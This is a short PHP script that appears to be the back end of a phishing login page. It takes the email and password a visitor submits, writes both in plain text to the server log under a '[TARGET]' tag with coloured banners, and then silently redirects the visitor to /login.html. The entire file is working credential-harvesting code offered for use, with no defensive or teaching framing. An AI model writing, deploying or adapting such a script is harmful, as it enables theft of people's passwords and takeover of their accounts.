<?php
$username = $_POST['email'] ?? '';
$Pass = $_POST['pass'];
error_log("\033[1;31m╔════════════════════════════════════╗\033[0m");
error_log("[TARGET] Username: " . $username);
error_log("[TARGET] PASSWORD: " . $Pass);
error_log("\033[1;31m╚════════════════════════════════════╝\033[0m");
header('Location: /login.html');
exit();
?>
